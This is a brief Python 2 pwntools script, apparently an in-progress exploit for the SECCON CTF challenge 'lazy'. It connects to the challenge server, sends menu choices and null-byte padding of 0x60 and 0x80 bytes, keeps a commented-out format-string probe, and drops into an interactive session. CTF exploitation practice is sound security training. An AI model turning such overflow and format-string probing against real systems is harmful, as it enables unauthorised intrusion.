#!/usr/bin/env python2

from pwn import *

#context.log_level = 'critical'

#p = process('./lazy')

i = 1

p = remote('lazy.chal.seccon.jp', 33333)
#p = process('./lazy')
p.recv()
p.sendline('2')

p.recvuntil(': ')
p.sendline('\x00'*0x60)

p.recvuntil(': ')
p.sendline('\x00'*0x80)

p.recv()
p.sendline('4')

p.recvuntil('name\n')
#p.sendline('%{}$s'.format(i))

p.interactive()